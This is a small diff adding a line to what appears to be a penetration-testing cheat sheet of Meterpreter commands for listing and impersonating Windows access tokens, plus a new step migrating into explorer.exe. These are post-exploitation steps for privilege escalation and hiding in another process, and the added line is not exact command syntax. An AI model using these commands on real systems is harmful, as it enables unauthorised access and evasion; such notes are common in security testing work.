@@ -15,4 +15,5 @@ Meterpreter:
 > load incognito
 > list_tokens -u
 > impersonate_token <"TOKEN">
+> migrate to explorer.exe
 ```
